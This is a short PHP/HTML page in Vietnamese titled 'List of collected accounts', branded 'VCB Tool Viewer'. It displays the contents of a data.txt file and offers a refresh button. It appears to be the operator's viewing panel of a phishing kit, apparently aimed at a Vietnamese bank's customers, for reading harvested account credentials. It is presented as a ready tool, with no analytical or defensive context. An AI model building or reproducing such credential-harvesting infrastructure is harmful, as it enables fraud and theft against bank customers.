<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Danh sách đã thu thập</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      padding: 40px;
      margin: 0;
    }
    .container {
      max-width: 700px;
      margin: auto;
      background: white;
      padding: 20px 30px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #0a8f3d;
    }
    button {
      background-color: #0a8f3d;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-bottom: 20px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #086a2f;
    }
    pre {
      background: #eee;
      padding: 15px;
      border-radius: 8px;
      white-space: pre-wrap;
      word-wrap: break-word;
    }
    .footer {
      margin-top: 30px;
      font-size: 13px;
      color: gray;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>📋 Danh sách tài khoản đã thu thập</h2>

    <form method="post">
      <button type="submit" name="refresh">🔁 Làm mới danh sách</button>
    </form>

    <pre>
<?php
  $filePath = 'data.txt';
  if (file_exists($filePath)) {
    $data = file_get_contents($filePath);
    echo htmlspecialchars($data);
  } else {
    echo "⚠️ Chưa có dữ liệu được thu thập.";
  }
?>
    </pre>

    <div class="footer">
      VCB Tool Viewer | &copy; 2025
    </div>
  </div>
</body>
</html>
